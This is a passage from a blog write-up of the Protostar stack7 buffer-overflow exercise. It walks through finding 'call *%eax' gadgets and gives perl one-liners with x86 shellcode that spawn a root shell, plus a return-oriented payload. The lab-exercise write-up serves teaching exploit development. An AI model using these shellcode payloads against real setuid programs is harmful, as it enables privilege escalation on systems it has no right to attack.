  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x0804A008</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0x00000001</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">s</span> <span class="n">z</span> <span class="n">a</span> <span class="n">p</span> <span class="n">c</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xCCCCCCCC</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFF630</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x41414141</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
</code></pre></div>
</p>

<p>With objdump we can find a suiteable location with the respective call to EAX.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">stack7</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">iP</span> <span class="s">&quot;call.*eax&quot;</span>
 <span class="nl">8048478:</span>	<span class="mh">ff 14 85 5c 96 04 08 </span>	<span class="nf">call</span>   <span class="p">*</span><span class="mi">0x804965c</span><span class="p">(,</span><span class="nv">%eax</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
 <span class="nl">80484bf:</span>	<span class="mh">ff d0 </span>               	<span class="nf">call</span>   <span class="p">*</span><span class="nv">%eax</span>
 <span class="nl">80485eb:</span>	<span class="mh">ff d0 </span>               	<span class="nf">call</span>   <span class="p">*</span><span class="nv">%eax</span>
</code></pre></div>
</p>

<p>So we only need to apply a suitable shellcode to exploit the flaw.
The respective command is as follows.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span> perl -e <span class="s1">&#39;print(&quot;\x90&quot;x4 .&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; .&quot;\xCC&quot;x(80-55-4) .&quot;\xeb\x85\x04\x08&quot; );&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack7
<span class="go">input path please: got path ����1�1۰̀Sh/ttyh/dev��&#39;�̀1�Ph//shh/bin�S�ᙰ</span>
<span class="go">                                                                    ̀�</span>
<span class="gp">#</span> whoami
<span class="go">root</span>
</code></pre></div>
</p>

<h2 id="rop-1:66762231c63507f267ea415391222411">ROP</h2>

<p>With the knowledge from the previous example we can also try return oriented programming.
We need to find the address of a ret call.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">getpath</span>
<span class="p">...</span>
<span class="mh">0x08048544</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span>       <span class="n">ret</span>    
</code></pre></div>
</p>

<p>The parameter for the function call is once again the beginning of the buffer.
In particular this is 0xbfffff5dc.
The final command to exploit the vulnerability is as follows.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span> perl -e <span class="s1">&#39;print(&quot;\x90&quot;x4 .&quot;\xe9\x1e\x00\x00\x00&quot; .&quot;\xb8\x04\x00\x00\x00&quot; .&quot;\xbb\x01\x00\x00\x00&quot; .&quot;\x59&quot; .&quot;\xba\x0f\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xb8\x01\x00\x00\x00&quot; .&quot;\xbb\x00\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xe8\xdd\xff\xff\xff&quot; .&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&quot; .&quot;\xCC&quot;x(80-53-4) .&quot;\x44\x85\x04\x08&quot; .&quot;\xdc\xf5\xff\xbf&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack7
<span class="go">input path please: got path �����</span>
<span class="go">Hello, World!�</span>
</code></pre></div>
</p>

<h1 id="links-and-references:66762231c63507f267ea415391222411">Links and References</h1>

<h2 id="exploit-exercises:66762231c63507f267ea415391222411">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-stack/">TheSprawl - protostar - stack levels</a></li>
<li><a href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/">Louis Li</a></li>
</ul>

<h2 id="return-oriented-programming:66762231c63507f267ea415391222411">Return-oriented Programming</h2>

<ul>
<li><a href="http://www.win.tue.nl/~aeb/linux/hh/hh-10.html#ss10.8">Hackers Hut</a></li>
<li><a href="http://www.fuzzysecurity.com/tutorials/expDev/7.html">FuzzySecurity ExploitDev: Part 7</a></li>
</ul>

<h2 id="other:66762231c63507f267ea415391222411">Other</h2>

<ul>
<li><a href="http://www.tenouk.com/cncplusplusbufferoverflow.html">Tenouk</a></li>
<li><a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/strdup.html">strdup</a></li>
<li><a href="http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set">Core dump suid binaries</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Format-String-levels/"> Exploit Exercises - Protostar - Format String levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/05/Offensive-Security-Certified-Professional/"> Offensive Security Certified Professional</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; . All rights reserved. </p>
    </footer>

  
  

  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>

  <script src="/js/bootstrap.min.js"></script>
  <script src="/js/bootstrap.js"></script>
  <script type="text/javascript" src="/js/hc.js"></script>

  
  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>

  

</footer>


	</body>
</html>
